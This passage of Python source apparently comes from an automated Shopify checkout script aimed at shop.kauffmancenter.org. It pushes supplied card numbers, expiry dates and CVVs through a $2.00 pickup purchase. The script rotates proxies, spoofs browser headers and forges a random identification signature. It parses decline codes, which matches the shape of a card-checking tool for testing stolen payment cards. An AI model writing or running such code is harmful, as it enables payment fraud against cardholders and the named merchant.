        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on session token: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("SESSION_TOKEN", str(e))
            return False, f"Session token error: {str(e)[:50]}"

    async def submit_proposal(self):
        """Step 3: Submit initial proposal"""
        self.step(3, "SUBMIT PROPOSAL", "Initiating checkout proposal")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'shop.kauffmancenter.org',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
        }
        
        if self.session_token:
            graphql_headers['x-checkout-one-session-token'] = self.session_token
        
        # Variables based on captured Proposal request
        variables = {
            "sessionInput": {
                "sessionToken": self.graphql_session_token
            },
            "queueToken": f"A{self.generate_random_string(43)}==",
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "geolocation": {
                            "coordinates": self.coordinates,
                            "countryCode": "US"
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["PICK_UP"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {
                        "items": {"value": 2}
                    },
                    "expectedTotalPrice": {
                        "value": {
                            "amount": "2.00",
                            "currencyCode": "USD"
                        }
                    },
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "memberships": {
                "memberships": []
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": "",
                        "address2": "",
                        "city": "",
                        "countryCode": "US",
                        "postalCode": "",
                        "firstName": "",
                        "lastName": "",
                        "zoneCode": "",
                        "phone": ""
                    }
                },
                "paymentFlexibilityTermsId": "gid://shopify/PaymentTermsTemplate/9"
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": "USD",
                    "countryCode": "US"
                },
                "phoneCountryCode": "US",
                "marketingConsent": [],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": []},
            "shopPayArtifact": {
                "optIn": {
                    "vaultEmail": "",
                    "vaultPhone": "",
                    "optInSource": "REMEMBER_ME"
                }
            },
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": []
        }
        
        payload = {
            "operationName": "Proposal",
            "variables": variables,
            "id": self.proposal_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=Proposal",
                headers=graphql_headers,
                json=payload,
                timeout=25
            )
            
            if resp.status_code != 200:
                return False, f"Proposal failed: {resp.status_code}"
            
            try:
                proposal_resp = resp.json()
                
                # Check for errors in response
                if 'errors' in proposal_resp and proposal_resp['errors']:
                    error_msgs = []
                    for error in proposal_resp['errors']:
                        error_code = error.get('code', 'UNKNOWN')
                        error_msgs.append(error_code)
                    
                    # Check for specific error codes that are acceptable
                    if any(code in ['BUYER_IDENTITY_MISSING_CONTACT_METHOD', 'PAYMENTS_FIRST_NAME_REQUIRED', 
                                    'PAYMENTS_LAST_NAME_REQUIRED', 'PAYMENTS_ADDRESS1_REQUIRED', 
                                    'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY', 'PAYMENTS_POSTAL_CODE_REQUIRED', 
                                    'PAYMENTS_CITY_REQUIRED'] for code in error_msgs):
                        self.logger.data_extracted("Proposal", "Acceptable validation errors received", "Expected")
                        return True, "VALIDATION_ERRORS"
                    
                    return False, f"DECLINED - {', '.join(error_msgs)}"
                
                # Extract queue token from response
                data = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                new_queue_token = data.get('queueToken')
                if new_queue_token:
                    self.queue_token = new_queue_token
                    self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Proposal response")
                    return True, self.queue_token
                
                return True, "PROPOSAL_SUCCESS"
                
            except Exception as e:
                return False, f"Failed to parse proposal response: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on proposal: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on proposal: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("PROPOSAL_ERROR", str(e))
            return False, f"Proposal error: {str(e)[:50]}"

    async def update_contact_info(self):
        """Step 4: Update contact information with email"""
        self.step(4, "UPDATE CONTACT", f"Setting email: {self.email}")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'shop.kauffmancenter.org',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': self.session_token
        }
        
        # Variables for contact update - based on captured flow
        variables = {
            "sessionInput": {
                "sessionToken": self.graphql_session_token
            },
            "queueToken": self.queue_token or f"A{self.generate_random_string(43)}==",
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "geolocation": {
                            "coordinates": self.coordinates,
                            "countryCode": "US"
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["PICK_UP"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {
                        "items": {"value": 2}
                    },
                    "expectedTotalPrice": {
                        "value": {
                            "amount": "2.00",
                            "currencyCode": "USD"
                        }
                    },
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "memberships": {
                "memberships": []
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": "",
                        "city": "",
                        "countryCode": "US",
                        "lastName": "",
                        "phone": ""
                    }
                },
                "paymentFlexibilityTermsId": "gid://shopify/PaymentTermsTemplate/9"
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": "USD",
                    "countryCode": "US"
                },
                "email": self.email,
                "emailChanged": True,
                "phoneCountryCode": "US",
                "marketingConsent": [{
                    "email": {"value": self.email}
                }],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": []},
            "shopPayArtifact": {
                "optIn": {
                    "vaultEmail": "",
                    "vaultPhone": "",
                    "optInSource": "REMEMBER_ME"
                }
            },
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": []
        }
        
        payload = {
            "operationName": "Proposal",
            "variables": variables,
            "id": self.proposal_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=Proposal",
                headers=graphql_headers,
                json=payload,
                timeout=25
            )
            
            if resp.status_code != 200:
                return False, f"Contact update failed: {resp.status_code}"
            
            try:
                contact_resp = resp.json()
                
                # Extract new queue token
                data = contact_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                new_queue_token = data.get('queueToken')
                if new_queue_token:
                    self.queue_token = new_queue_token
                
                return True, "CONTACT_UPDATED"
                
            except Exception as e:
                return False, f"Failed to parse contact response: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on contact update: {str(e)}")
            return False, "PROXY_DEAD"
        except Exception as e:
            self.logger.error_log("CONTACT_UPDATE", str(e))
            return False, f"Contact update error: {str(e)[:50]}"

    async def select_pickup_delivery(self):
        """Step 5: Select pickup delivery method (Kauffman Center location)"""
        self.step(5, "SELECT PICKUP", "Choosing Kauffman Center pickup location")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'shop.kauffmancenter.org',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': self.session_token
        }
        
        # Variables for pickup selection based on captured request
        variables = {
            "sessionInput": {
                "sessionToken": self.graphql_session_token
            },
            "queueToken": self.queue_token,
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "geolocation": {
                            "coordinates": self.coordinates,
                            "countryCode": "US"
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": self.delivery_strategy_handle,
                            "customDeliveryRate": False
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {
                        "lines": [{"stableId": self.stable_id}]
                    },
                    "deliveryMethodTypes": ["PICK_UP"],
                    "expectedTotalPrice": {
                        "value": {"amount": "0.00", "currencyCode": "USD"}
                    },
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {
                        "items": {"value": 2}
                    },
                    "expectedTotalPrice": {
                        "value": {"amount": "2.00", "currencyCode": "USD"}
                    },
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": "",
                        "city": "",
                        "countryCode": "US",
                        "lastName": "",
                        "phone": ""
                    }
                },
                "paymentFlexibilityTermsId": "gid://shopify/PaymentTermsTemplate/9"
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": "USD",
                    "countryCode": "US"
                },
                "email": self.email,
                "emailChanged": False,
                "phoneCountryCode": "US",
                "marketingConsent": [{
                    "email": {"value": self.email}
                }],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": []},
            "shopPayArtifact": {
                "optIn": {
                    "vaultEmail": "",
                    "vaultPhone": "",
                    "optInSource": "REMEMBER_ME"
                }
            },
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": []
        }
        
        payload = {
            "operationName": "Proposal",
            "variables": variables,
            "id": self.proposal_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=Proposal",
                headers=graphql_headers,
                json=payload,
                timeout=25
            )
            
            if resp.status_code != 200:
                return False, f"Pickup selection failed: {resp.status_code}"
            
            try:
                pickup_resp = resp.json()
                
                # Extract new queue token
                data = pickup_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                new_queue_token = data.get('queueToken')
                if new_queue_token:
                    self.queue_token = new_queue_token
                
                return True, "PICKUP_SELECTED"
                
            except Exception as e:
                return False, f"Failed to parse pickup response: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on pickup selection: {str(e)}")
            return False, "PROXY_DEAD"
        except Exception as e:
            self.logger.error_log("PICKUP_SELECTION", str(e))
            return False, f"Pickup selection error: {str(e)[:50]}"

    async def create_payment_session(self, cc, mes, ano, cvv):
        """Step 6: Create payment session with PCI"""
        self.step(6, "CREATE PAYMENT", "Creating payment session with PCI")
        
        pci_headers = {
            'authority': 'checkout.pci.shopifyinc.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/build/070d608/number-ltr.html?identifier=&locationURL=',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'active',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
        }
        
        # Generate shopify-identification-signature (similar to captured)
        header = base64.urlsafe_b64encode(json.dumps({"kid": "v1", "alg": "HS256"}).encode()).decode().rstrip('=')
        payload_data = {
            "client_id": "2",
            "client_account_id": self.shop_id,
            "unique_id": self.checkout_token,
            "iat": int(time.time())
        }
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
        signature = self.generate_random_string(43)
        shopify_signature = f"{header}.{payload_b64}.{signature}"
        
        pci_headers['shopify-identification-signature'] = shopify_signature
        
        # Format card details
        card_number = cc.replace(" ", "").replace("-", "")
        year_full = ano if len(ano) == 4 else f"20{ano}"
        month_int = int(mes)
        
        # PCI payload from captured
        pci_payload = {
            "credit_card": {
                "number": card_number,
                "month": month_int,
                "year": int(year_full),
                "verification_value": cvv,
                "name": self.full_name,
                "start_month": None,
                "start_year": None,
                "issue_number": ""
            },
            "payment_session_scope": "shop.kauffmancenter.org"
        }
        
        try:
            # Use separate client for PCI
            async with httpx.AsyncClient(proxy=self.proxy_url, timeout=25) as pci_client:
                resp = await pci_client.post(
                    'https://checkout.pci.shopifyinc.com/sessions',
                    headers=pci_headers,
                    json=pci_payload,
                    timeout=25
                )
                
                if resp.status_code != 200:
                    return False, f"PCI session creation failed: {resp.status_code}"
                
                try:
                    pci_resp = resp.json()
                    payment_session_id = pci_resp.get('id')
                    if not payment_session_id:
                        return False, "No payment session ID returned"
                    
                    self.logger.data_extracted("Payment Session ID", payment_session_id[:20] + "...", "PCI")
                    return True, payment_session_id
                    
                except Exception as e:
                    return False, f"Failed to parse PCI response: {str(e)[:50]}"
                    
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on PCI: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout on PCI: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("PCI_ERROR", str(e))
            return False, "PCI_ERROR"

    async def update_billing_address(self, payment_session_id):
        """Step 7: Update billing address with pickup location address"""
        self.step(7, "UPDATE BILLING", f"Setting billing address: {self.address['address1']}, {self.address['city']}, {self.address['provinceCode']} {self.address['zip']}")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'shop.kauffmancenter.org',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': self.session_token
        }
        
        # Variables for billing address update based on captured request
        variables = {
            "sessionInput": {
                "sessionToken": self.graphql_session_token
            },
            "queueToken": self.queue_token,
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "geolocation": {
                            "coordinates": self.coordinates,
                            "countryCode": "US"
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": self.delivery_strategy_handle,
                            "customDeliveryRate": False
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {
                        "lines": [{"stableId": self.stable_id}]
                    },
                    "deliveryMethodTypes": ["PICK_UP"],
                    "expectedTotalPrice": {
                        "value": {"amount": "0.00", "currencyCode": "USD"}
                    },
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {
                        "items": {"value": 2}
                    },
                    "expectedTotalPrice": {
                        "value": {"amount": "2.00", "currencyCode": "USD"}
                    },
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [{
                    "paymentMethod": {
                        "directPaymentMethod": {
                            "paymentMethodIdentifier": self.payment_method_identifier,
                            "sessionId": payment_session_id,
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": self.address["address1"],
                                    "address2": self.address["address2"],
                                    "city": self.address["city"],
                                    "countryCode": self.address["countryCode"],
                                    "postalCode": self.address["zip"],
                                    "firstName": self.first_name,
                                    "lastName": self.last_name,
                                    "zoneCode": self.address["provinceCode"],
                                    "phone": ""
                                }
                            },
                            "cardSource": None
                        },
                        "giftCardPaymentMethod": None,
                        "redeemablePaymentMethod": None,
                        "walletPaymentMethod": None,
                        "walletsPlatformPaymentMethod": None,
                        "localPaymentMethod": None,
                        "paymentOnDeliveryMethod": None,
                        "paymentOnDeliveryMethod2": None,
                        "manualPaymentMethod": None,
                        "customPaymentMethod": None,
                        "offsitePaymentMethod": None,
                        "customOnsitePaymentMethod": None,
                        "deferredPaymentMethod": None,
                        "customerCreditCardPaymentMethod": None,
                        "paypalBillingAgreementPaymentMethod": None,
                        "remotePaymentInstrument": None
                    },
                    "amount": {
                        "value": {
                            "amount": "2.00",
                            "currencyCode": "USD"
                        }
                    }
                }],
                "billingAddress": {
                    "streetAddress": {
                        "address1": self.address["address1"],
                        "address2": self.address["address2"],
                        "city": self.address["city"],
                        "countryCode": self.address["countryCode"],
                        "postalCode": self.address["zip"],
                        "firstName": self.first_name,
                        "lastName": self.last_name,
                        "zoneCode": self.address["provinceCode"],
                        "phone": ""
                    }
                },
                "paymentFlexibilityTermsId": "gid://shopify/PaymentTermsTemplate/9"
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": "USD",
                    "countryCode": "US"
                },
                "email": self.email,
                "emailChanged": False,
                "phoneCountryCode": "US",
                "marketingConsent": [{
                    "email": {"value": self.email}
                }],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": []},
            "shopPayArtifact": {
                "optIn": {
                    "vaultEmail": "",
                    "vaultPhone": "",
                    "optInSource": "REMEMBER_ME"
                }
            },
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": []
        }
        
        payload = {
            "operationName": "Proposal",
            "variables": variables,
            "id": self.proposal_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=Proposal",
                headers=graphql_headers,
                json=payload,
                timeout=25
            )
            
            if resp.status_code != 200:
                return False, f"Billing update failed: {resp.status_code}"
            
            try:
                billing_resp = resp.json()
                
                # Extract new queue token
                data = billing_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                new_queue_token = data.get('queueToken')
                if new_queue_token:
                    self.queue_token = new_queue_token
                
                return True, "BILLING_UPDATED"
                
            except Exception as e:
                return False, f"Failed to parse billing response: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error on billing update: {str(e)}")
            return False, "PROXY_DEAD"
        except Exception as e:
            self.logger.error_log("BILLING_UPDATE", str(e))
            return False, f"Billing update error: {str(e)[:50]}"

    async def submit_for_completion(self, payment_session_id):
        """Step 8: Submit for completion - final payment"""
        self.step(8, "SUBMIT PAYMENT", "Finalizing payment of 2.00$")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'shop.kauffmancenter.org',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': self.session_token
        }
        
        # Generate attempt token (checkout-token-random)
        attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
        
        # Variables based on captured SubmitForCompletion request
        variables = {
            "input": {
                "sessionInput": {
                    "sessionToken": self.graphql_session_token
                },
                "queueToken": self.queue_token,
                "discounts": {
                    "lines": [],
                    "acceptUnexpectedDiscounts": True
                },
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "geolocation": {
                                "coordinates": self.coordinates,
                                "countryCode": "US"
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle": self.delivery_strategy_handle,
                                "customDeliveryRate": False
                            },
                            "options": {}
                        },
                        "targetMerchandiseLines": {
                            "lines": [{"stableId": self.stable_id}]
                        },
                        "deliveryMethodTypes": ["PICK_UP"],
                        "expectedTotalPrice": {
                            "value": {"amount": "0.00", "currencyCode": "USD"}
                        },
                        "destinationChanged": True
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True
                },
                "deliveryExpectations": {
                    "deliveryExpectationLines": []
                },
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": self.stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                                "sellingPlanDigest": None
                            }
                        },
                        "quantity": {
                            "items": {"value": 2}
                        },
                        "expectedTotalPrice": {
                            "value": {"amount": "2.00", "currencyCode": "USD"}
                        },
                        "lineComponentsSource": None,
                        "lineComponents": []
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"any": True},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": self.payment_method_identifier,
                                "sessionId": payment_session_id,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": self.address["address1"],
                                        "address2": self.address["address2"],
                                        "city": self.address["city"],
                                        "countryCode": self.address["countryCode"],
                                        "postalCode": self.address["zip"],
                                        "firstName": self.first_name,
                                        "lastName": self.last_name,
                                        "zoneCode": self.address["provinceCode"],
                                        "phone": ""
                                    }
                                },
                                "cardSource": None
                            },
                            "giftCardPaymentMethod": None,
                            "redeemablePaymentMethod": None,
                            "walletPaymentMethod": None,
                            "walletsPlatformPaymentMethod": None,
                            "localPaymentMethod": None,
                            "paymentOnDeliveryMethod": None,
                            "paymentOnDeliveryMethod2": None,
                            "manualPaymentMethod": None,
                            "customPaymentMethod": None,
                            "offsitePaymentMethod": None,
                            "customOnsitePaymentMethod": None,
                            "deferredPaymentMethod": None,
                            "customerCreditCardPaymentMethod": None,
                            "paypalBillingAgreementPaymentMethod": None,
                            "remotePaymentInstrument": None
                        },
                        "amount": {
                            "value": {
                                "amount": "2.00",
                                "currencyCode": "USD"
                            }
                        }
                    }],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": self.address["address1"],
                            "address2": self.address["address2"],
                            "city": self.address["city"],
                            "countryCode": self.address["countryCode"],
                            "postalCode": self.address["zip"],
                            "firstName": self.first_name,
                            "lastName": self.last_name,
                            "zoneCode": self.address["provinceCode"],
                            "phone": ""
                        }
                    },
                    "paymentFlexibilityTermsId": "gid://shopify/PaymentTermsTemplate/9"
                },
